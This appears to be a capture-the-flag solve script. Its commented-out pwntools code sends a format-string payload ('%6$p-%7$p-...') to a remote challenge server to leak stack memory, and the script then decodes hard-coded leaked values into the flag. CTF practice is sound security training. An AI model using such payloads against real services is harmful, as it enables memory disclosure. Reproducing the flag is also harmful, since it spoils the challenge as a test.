# #nc 13.214.30.13 10001

from pwn import *
from binascii import unhexlify, hexlify
import struct

# p = remote("13.214.30.13", 10001)
# p.recvuntil(b"?")
# p.sendline(b"%6$p-%7$p-%8$p-%9$p")
# p.recvline()

# ans = p.recvline()
# p.close()
# print(ans)

flag = "0x5f6573757b465443-0x635f66746e697270-0x796c6c7566657261-0x7f7d7a6c705f"
arrflag = flag.split("-")

ans = b''
for item in arrflag:
  ans += p64(int(item, 16))

print(ans.decode())